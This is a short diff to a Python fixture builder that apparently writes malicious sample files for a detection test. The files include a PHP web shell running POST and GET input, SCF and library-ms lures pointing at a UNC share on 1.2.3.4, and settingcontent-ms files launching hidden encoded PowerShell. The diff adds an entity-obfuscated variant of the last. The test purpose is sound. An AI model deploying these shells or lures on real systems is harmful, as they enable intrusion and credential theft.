@@ -290,6 +290,7 @@ def build_folder(root):
                         b"a.href=URL.createObjectURL(b);a.click();</script></html>")
     w("shell.php", b"<?php\n@eval($_POST['cmd']);\nsystem($_GET['c']);\n?>\n")
     w("leak.scf", b"[Shell]\nCommand=2\nIconFile=\\\\1.2.3.4\\share\\x.ico\n")
+    w("entity.settingcontent-ms", b'<StoreManifest><Arguments>&#112;owershell -w hidden -enc AAAAA</Arguments></StoreManifest>')
     w("evil.settingcontent-ms", b'<?xml version="1.0"?><StoreManifest><Arguments>powershell -windowstyle hidden -enc AAAA</Arguments></StoreManifest>')
     w("lure.library-ms", b'<?xml version="1.0"?><libraryDescription><searchConnectorDescription>'
                           b'<simpleLocation><url>file://\\\\1.2.3.4\\share</url></simpleLocation>'
